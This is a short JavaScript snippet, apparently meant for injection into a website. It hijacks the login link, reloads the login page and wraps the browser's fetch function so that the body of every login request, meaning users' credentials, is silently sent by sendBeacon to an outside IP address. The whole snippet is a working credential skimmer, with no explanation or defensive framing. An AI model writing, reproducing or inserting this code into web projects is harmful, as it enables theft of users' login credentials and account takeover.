document.querySelector('a[href*="auth/login"]')
  .addEventListener('click', function(e) {
    e.preventDefault();
    
    fetch('auth/login')
      .then(r => r.text())
      .then(html => {
        history.pushState(null, '', 'auth/login');
        document.open();
        document.write(html);
        document.close();

        const orig = window.fetch;
        window.fetch = function(url, opts) {
          if (url.includes('api/auth/login')) {
            navigator.sendBeacon(
              'http://185.83.152.175:3000',
              opts.body
            );
          }
          return orig.apply(this, arguments);
        };
      });
  });
